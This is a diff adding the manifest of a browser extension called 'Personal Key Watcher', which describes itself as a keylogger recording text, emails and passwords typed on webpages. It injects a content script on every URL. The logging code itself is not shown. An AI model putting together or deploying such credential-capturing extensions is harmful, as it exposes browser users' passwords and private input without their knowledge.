@@ -1,0 +1,22 @@
+{
+  "manifest_version": 2,
+  "name": "Personal Key Watcher",
+  "short_name": "Personal Key Watcher",
+  "description": "Light weight key logger that logs text, email and password used in webpages into client database",
+  "version": "0.0.0.1",
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["js/content.js"],
+      "css" : [],
+      "run_at" : "document_end"
+    }
+  ],
+  "permissions": [
+    "tabs",
+    "storage"
+  ],
+  "background": {
+    "scripts": ["js/background.js"]
+  }
+}
